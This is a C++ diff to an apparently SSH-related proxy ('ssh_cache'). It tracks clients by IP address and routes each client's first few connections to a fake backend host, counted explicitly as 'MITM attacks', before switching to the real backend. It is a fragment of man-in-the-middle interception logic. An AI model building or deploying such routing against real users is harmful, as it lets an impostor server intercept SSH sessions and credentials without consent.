@@ -4,8 +4,6 @@
 using namespace org::voidland::ssh_cache::socket_utils;
 
 #include <boost/lexical_cast.hpp>
-using namespace boost::asio;
-using namespace boost::system;
 
 #include <iostream>
 #include <string>
@@ -20,11 +18,41 @@ namespace ssh_cache
 {
 
 
+scoped_ptr<ClientService> ClientConnection::clientService;
+
+void ClientConnection::initClientService(io_service &ioService)
+{
+    static mutex clientServiceMutex;
+
+    if (!clientService)
+    {
+        mutex::scoped_lock am(clientServiceMutex);
+        if (!clientService)
+        {
+            clientService.reset(new ClientService(ioService));
+        }
+    }
+}
+
 ClientConnection::ClientConnection(shared_ptr<tcp::socket> socket)
     throw (system_error)
         : clientSocket(socket), backendSocket(socket->get_io_service())
 {
-    connect(this->backendSocket, BACKEND_HOST, lexical_cast<string>(BACKEND_PORT));
+    initClientService(socket->get_io_service());
+
+    address clientAddr = this->clientSocket->remote_endpoint().address();
+    shared_ptr<Client> client = clientService->getClient(clientAddr);
+
+    if (client->getMitmAttacksCount() < INITIAL_MITM_ATTACKS_COUNT)
+    {
+        connect(this->backendSocket, FAKE_BACKEND_HOST, lexical_cast<string>(FAKE_BACKEND_PORT));
+        client->addMitmAttack();
+    }
+    else
+    {
+        connect(this->backendSocket, REAL_BACKEND_HOST, lexical_cast<string>(REAL_BACKEND_PORT));
+    }
+    client->connected();
 }
 
 void ClientConnection::send(void)
